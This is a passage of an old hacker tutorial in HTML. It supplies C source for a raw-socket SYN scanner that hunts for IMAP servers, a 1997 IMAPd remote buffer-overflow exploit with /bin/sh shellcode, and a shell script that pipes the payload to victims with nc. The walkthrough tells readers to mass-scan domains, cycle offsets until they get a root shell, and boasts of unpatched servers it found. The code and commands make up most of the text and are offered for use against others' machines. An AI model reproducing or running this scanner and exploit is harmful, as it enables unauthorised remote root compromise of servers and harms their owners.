+<P>#include &lt;sys/ioctl.h&gt;</P>
+<P>#include &lt;netinet/ip.h&gt;</P>
+<P>#include &lt;netinet/ip_icmp.h&gt;</P>
+<P>#include &lt;netinet/in.h&gt;</P>
+<P>#include "../../includes/ADM-spoof.c"</P>
+<P>#include "../../includes/pres.c"</P>
+<P>&nbsp;</P>
+<P> host2ip(char *serv)</P>
+<P>{</P>
+<P>   struct sockaddr_in sinn;</P>
+<P>   struct hostent *hent;</P>
+<P>      </P>
+<P>  hent=gethostbyname(serv);</P>
+<P>  if(hent == NULL) return 0;</P>
+<P>  bzero((char *)&amp;sinn, sizeof(sinn));</P>
+<P>  bcopy(hent-&gt;h_addr, (char *)&amp;sinn.sin_addr, hent-&gt;h_length);</P>
+<P>  return sinn.sin_addr.s_addr;</P>
+<P> }</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>int raw_send,raw_tcp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>                     </P>
+<P>main(int argc, char **argv)</P>
+<P>{</P>
+<P>struct sockaddr_in recv_dst;</P>
+<P>unsigned long da_ip;</P>
+<P>char buffer[4096],reply[256];</P>
+<P>char buffer2[20];</P>
+<P>&nbsp;</P>
+<P>int on=1,off=0,verbose=1,goout=0,goin=0,timez2=0,autotime=0,regular=10;</P>
+<P>int i=0,j,resu,n,len,auto3,timez=8,max_try=2;</P>
+<P>&nbsp;</P>
+<P>FILE *log;</P>
+<P>FILE *IPSRC;</P>
+<P>FILE *HOSTF;</P>
+<P>pid_t pid;</P>
+<P>&nbsp;</P>
+<P>unsigned long int nip;</P>
+<P>struct iphdr *ip=(struct iphdr*)buffer;</P>
+<P>struct tcphdr *tcp=(struct tcphdr*)(buffer+IPHDRSIZE); </P>
+<P>&nbsp;</P>
+<P>HOSTF=fopen(argv[2],"r");</P>
+<P>IPSRC=fopen("IPSRC","w+");</P>
+<P>IPFILEZ(HOSTF,IPSRC);</P>
+<P>fclose(HOSTF);</P>
+<P>rewind(IPSRC);</P>
+<P>&nbsp;</P>
+<P>pres();</P>
+<P>&nbsp;</P>
+<P> </P>
+<P>printf("ADMimap ver 1.1 (c) ADM\n");</P>
+<P>if(argc&lt;4){</P>
+<P>printf("\nusage: ADMimap &lt;yourIP&gt; &lt;IP file&gt; &lt;delay&gt;\n");</P>
+<P>printf("\n&lt;yourIP&gt; = ADMimap needs your IP for make the scan\nbut u can scan with www.nasa.gov if u want ;))\n");</P>
+<P>printf("&lt;IP file&gt;  = the filez of ip u want scan\ntry a :# host -l nasa.gov &gt; ipfilez for scan ALL nasa.gov\n");</P>
+<P>printf("&lt;delay&gt;    = define the delay in second for waiting the ACK type 0 for auto\n");</P>
+<P>exit(0);</P>
+<P>}                   </P>
+<P>                  &#9;               </P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&#9;log=fopen("imapdlog","w");</P>
+<P>&#9;if (log==NULL) {</P>
+<P>&#9;&#9;perror("fopen");</P>
+<P>&#9;&#9;exit(1);</P>
+<P>&#9;}</P>
+<P>&#9;</P>
+<P>&#9;</P>
+<P>&#9;raw_send=socket(AF_INET, SOCK_RAW, 255);</P>
+<P>&#9;if(raw_send == -1) {</P>
+<P>&#9;&#9;printf("cant open raw socket for sending\n");</P>
+<P>&#9;&#9;exit(1);</P>
+<P>&#9;}</P>
+<P>&#9;raw_tcp=socket(AF_INET ,SOCK_RAW ,6);</P>
+<P>&#9;</P>
+<P>&#9;if (raw_tcp == -1) {</P>
+<P>&#9;&#9;printf("can't open raw socket for receiving\n");</P>
+<P>&#9;&#9;exit(1);</P>
+<P>&#9;}</P>
+<P>&#9;</P>
+<P>&#9;ioctl(raw_tcp,FIONBIO,&amp;on);</P>
+<P>&nbsp;</P>
+<P>&#9;</P>
+<P> </P>
+<P>&nbsp;</P>
+<P>if(timez2=atoi(argv[3]) == 0)</P>
+<P>  {</P>
+<P>  auto3 = 1;</P>
+<P>  printf(" AUTO ON ! \n");</P>
+<P>  }</P>
+<P>else{timez2=atoi(argv[3])*50;}</P>
+<P>&nbsp;</P>
+<P>for(;;){</P>
+<P>&#9;               </P>
+<P>&#9;               if(!feof(IPSRC)){</P>
+<P>&#9;&#9;        fscanf(IPSRC,"%s",buffer2);</P>
+<P>&#9;&#9;        printf(" sendto %s\n",buffer2); </P>
+<P>&#9;&#9;        autotime++;</P>
+<P>&#9;&#9;        send_pkt(raw_send,host2ip(argv[1]),host2ip(buffer2),</P>
+<P>&#9;&#9;        2666,143,TH_SYN,111,111,0,NULL,0);</P>
+<P>&#9;                          }</P>
+<P>&#9; if(feof(IPSRC))goout=3;</P>
+<P>&#9;  </P>
+<P>&#9; </P>
+<P>&#9; if(goout&gt;1){</P>
+<P>&#9;  usleep(1);</P>
+<P>&#9;  goin++;</P>
+<P>&#9;  }                        </P>
+<P>&#9; </P>
+<P>&#9;</P>
+<P>&#9;if(auto3==1){ </P>
+<P>&#9; </P>
+<P>&#9; if(goin &gt; autotime*regular )</P>
+<P>&#9;    {</P>
+<P>&#9;    fclose(log);</P>
+<P>&#9;    exit (0); </P>
+<P>&#9;  }    </P>
+<P>&#9;}                       </P>
+<P>&#9;</P>
+<P>&#9;else{</P>
+<P>&#9;   </P>
+<P>&#9;   if(goin &gt; timez2){ </P>
+<P>&#9;    fclose(log);</P>
+<P>&#9;     exit(0);} </P>
+<P>&#9;   </P>
+<P>&#9;   }</P>
+<P>&#9;                         </P>
+<P>&#9;buffer[0]='0';&#9;</P>
+<P>&#9;get_pkt(raw_tcp,buffer,400);</P>
+<P>&#9;</P>
+<P>&nbsp;</P>
+<P>&#9;if(buffer[0]!='0'){</P>
+<P>         </P>
+<P>&#9;   if(tcp-&gt;th_dport == htons(2666)){</P>
+<P>           </P>
+<P>&#9;      if(tcp-&gt;th_sport == htons(143)){</P>
+<P>&#9;      </P>
+<P>&#9;                           resu= (tcp-&gt;th_flags |  TH_ACK) ;</P>
+<P>&#9;                                     </P>
+<P>&#9;                                     if(resu==18)</P>
+<P>&#9;                                      { </P>
+<P>&#9;                                      fprintf(log,"imapd on %s\n",inet_ntoa(ip-&gt;saddr));</P>
+<P>&#9;                                      fflush(log);     </P>
+<P>&#9;                                      }</P>
+<P>&#9;       </P>
+<P>&#9;       }</P>
+<P>&#9;    }               </P>
+<P>&#9; }  </P>
+<P>      }</P>
+<P>&nbsp;</P>
+<P>&#9;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>fclose(log);</P>
+<P>&nbsp;</P>
+<P>} </P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>Cut and paste the C code into a shell…then compile with cc -o imapdscan imapdscan.c</P>
+<P>To use the probe you need a list of servers to scan..use the scanip.sh shell script to scan subnets for servers and use the output file in the probe</P>
+<P>&nbsp;</P>
+<P>Now that you have a servers list and the probe compiled lets scan for open imapd in each one</P>
+<P>type imapdscan &lt;your ip&gt; &lt;ip list&gt; 0 and the probe starts scanning ..you can do a ctrl-z to suspend it and use command bg to put it on background ..drink some beers and wait till it finish checking</P>
+<P>You should get a output file called imapdlog..there you got all the server with imapd service open</P>
+<P>Now lets check if the sucker is vulnerable to the remote imapd exploit…</P>
+<P>&nbsp;</P>
+<P>Cut the following source code and compile it in a shell using cc -o imapd imapd.c</P>
+<P>&nbsp;</P>
+<P>imapd.c</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>/*</P>
+<P> * IMAPd Linux/intel remote xploit by savage@apostols.org 1997-April-05</P>
+<P> *</P>
+<P> * Special THANKS to: b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore and the rest of ToXyn !!!</P>
+<P> *</P>
+<P> * usage:</P>
+<P> *&#9;$ (imap 0; cat) | nc victim 143</P>
+<P> *              |</P>
+<P> *              +--&gt; usually from -100 to 100</P>
+<P> */</P>
+<P>&nbsp;</P>
+<P>#include &lt;stdio.h&gt;</P>
+<P>&nbsp;</P>
+<P>char shell[] = </P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"</P>
+<P>"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"</P>
+<P>"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"</P>
+<P>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</P>
+<P>"\xe8\xc0\xff\xff\xff/bin/sh";</P>
+<P>&nbsp;</P>
+<P>char username[1024+255];</P>
+<P>&nbsp;</P>
+<P>void main(int argc, char *argv[]) {</P>
+<P>&#9;int i,a;</P>
+<P>&#9;long val;</P>
+<P>&#9;</P>
+<P>&#9;if(argc&gt;1)</P>
+<P>&#9;&#9;a=atoi(argv[1]);</P>
+<P>&#9;else</P>
+<P>&#9;&#9;a=0;</P>
+<P>&#9;</P>
+<P>&#9;strcpy(username,shell);</P>
+<P>&#9;</P>
+<P>&#9;for(i=strlen(username);i&lt;sizeof(username);i++)</P>
+<P>&#9;&#9;username[i]=0x90; /* NOP */</P>
+<P>&nbsp;</P>
+<P>&#9;val = 0xbffff501 + a;</P>
+<P>&nbsp;</P>
+<P>&#9;for(i=1024;i&lt;strlen(username)-4;i+=4) </P>
+<P>&#9;{</P>
+<P>&#9;&#9;username[i+0] = val &amp; 0x000000ff;</P>
+<P>&#9;&#9;username[i+1] = (val &amp; 0x0000ff00) &gt;&gt; 8;</P>
+<P>&#9;&#9;username[i+2] = (val &amp; 0x00ff0000) &gt;&gt; 16;</P>
+<P>&#9;&#9;username[i+3] = (val &amp; 0xff000000) &gt;&gt; 24;</P>
+<P>&#9;}</P>
+<P>&#9;</P>
+<P>&#9;username[ sizeof(username)-1 ] = 0;</P>
+<P>&#9;</P>
+<P>        printf("%d LOGIN \"%s\" pass\n", sizeof(shell), username);</P>
+<P>}</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>&nbsp;</P>
+<P>Then use the following  shell script to test each of the domains in your imaplog file</P>
+<P>&nbsp;</P>
+<P>imapd-exp.sh</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>#!/bin/sh</P>
+<P>#Top offsets, by b0fh: 0,40,30,10,-10,100,200</P>
+<P>if [ $# -eq '1' ]; then</P>
+<P>  echo "using offset 0"</P>
+<P>  ( imapd 0; while /bin/true; do read L; echo $L;done) | nc $1 143</P>
+<P>else</P>
+<P> if [ $# -eq '2' ]; then</P>
+<P>  echo "using offset $2"</P>
+<P>  ( imapd $2; while /bin/true; do read L; echo $L;done) | nc $1 143</P>
+<P> else</P>
+<P>  echo "Usage: $0 &lt;host&gt; [&lt;offset&gt;]"</P>
+<P> fi</P>
+<P>fi</P>
+<P>--------------------------------------------Cut here-----------------------------------------------------</P>
+<P>&nbsp;</P>
+<P>Don’t forget that the imapd exploit only works for linux/intel machines…so the best thing to do is telnet for each of the ips in the imapdlog file and see what system the machine is running</P>
+<P>&nbsp;</P>
+<P>Lets now see two examples ..run the shell script called imap-exp.sh like this</P>
+<P>&nbsp;</P>
+<P>machine% imapd-exp.sh victim.com</P>
+<P>This will try the offset 0 on the victim.com machine…and a message like this should appear</P>
+<P>&nbsp;</P>
+<P>Trying offser 0</P>
+<P>imapd response from the machine</P>
+<P>&nbsp;</P>
+<P>with the telnet client local echo option on write /bin/bash -i</P>
+<P>if the machine is not exploitable an error message should appear saying you have typed an invalid command and asking you to authenticate</P>
+<P>If not and the offset 0 was the one you should get a root bash on your screen…something like this #</P>
+<P>if nothing happens and no error message is given then try some more offsets..use the ones given in the shell script (40,30,10,-10,100,200)…and if none is good then keep trying cause you own root there</P>
+<P>&nbsp;</P>
+<P>I scanned Imapd on some primary domains and the results were great ..lots of servers still not patched, only the 4.2 RedHat was released with the bug fixed and older kernels on RedHat distributions, like the 4.0 and the 4.1 were vulnerable to the exploit. My success in slackware wasn’t so great..but still some 2.0.27 were caught.</P>
+<P>I’m preparing a perl script to grab the imapdlog file and choose the ones valid to the bug (Linux kernels) and in a future release I will distribute it</P>
+<P>&nbsp;</P>
+<P>Well…that’s all for today…theres much more mass stuff around there…but for now this should do</P>
+<P>All the source code here is taken from someone else mind..and all the authors names were respected</P>
+<P>Thanks to Kore, the GFX Guru for the D00M logo</P>
+<P>&nbsp;</P>
+<B><P>Greeting fellows of the &quot;art&quot;</P>
+</B><P>I’m D00M, Master of Perversion</P>
+<P>     <IMG SRC="image1.gif" WIDTH=400 HEIGHT=300 BORDER=0></P>
+<P>Mail d00mster@usa.net</P>
+<P>Visit: PtNeet channels #hackers and #hackers_hideout</P>
+<P>Darknet channel #hack</P>
+<P>&nbsp;</P>
+<P>D00M Over and Out</P>
+
+
+
+
+</FONT>
+</BODY>
+</HTML>
